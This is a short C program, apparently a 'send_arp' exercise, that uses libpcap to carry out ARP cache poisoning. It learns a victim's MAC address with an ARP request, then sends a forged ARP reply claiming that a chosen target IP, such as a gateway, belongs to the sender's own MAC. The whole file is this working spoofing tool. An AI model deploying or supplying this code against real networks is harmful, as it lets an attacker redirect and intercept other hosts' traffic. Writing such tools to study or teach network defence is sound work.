#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "send_arp.h"



int main(int argc, char * argv[]){
    unsigned char* arp_packet;
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    int fd;
    struct ifreq ifr_m;
    struct ifreq ifr_i;
    unsigned char *mac;
    uint32_t *ip;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr_m.ifr_addr.sa_family = AF_INET;
    ifr_i.ifr_addr.sa_family = AF_INET;
    strncpy(ifr_m.ifr_name , dev , IFNAMSIZ-1);
    strncpy(ifr_i.ifr_name , dev , IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr_m);
    ioctl(fd, SIOCGIFADDR, &ifr_i);
    close(fd);
    mac = (unsigned char *)ifr_m.ifr_hwaddr.sa_data;
    ip = (uint32_t *)&(((struct sockaddr_in *)&ifr_i.ifr_addr)->sin_addr);
    //----------------mac addr------------------

    printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf("IP : %s\n", inet_ntoa(*(struct in_addr *)ip));
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

        arp_packet = request(mac, ip, argv[2]);
        for(int j=0; j<42; j++){
            printf("%02x ", arp_packet[j]);
        }
        printf("\n");

        while (true){
            pcap_sendpacket(handle, arp_packet, 42);
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            struct eth_header *eth = (struct eth_header *)packet;
            if(ntohs(eth->eth_type) == 0x0806) {
                struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
                if (ntohs(arp->opcode) == 0x0002){
                    memcpy(arp_packet, &eth->smac, sizeof(uint8_t)*6);
                    memcpy(arp_packet+32, &eth->smac, sizeof(uint8_t)*6);
                    uint32_t t_ip = inet_addr(argv[3]);
                    memcpy(arp_packet+28, &t_ip, sizeof(uint8_t)*4);
                    *(arp_packet+21) = 0x02;
                    printf("-----packet-----\n");
                    for(int j=0; j<42; j++){
                        printf("%02x ", arp_packet[j]);
                    }
                    printf("\n\n");
                    break;
                }
            }
        }

    pcap_sendpacket(handle, arp_packet, 42);
    printf("arp_packet success\n");

    pcap_close(handle);

    free(arp_packet);
    return 0;
}
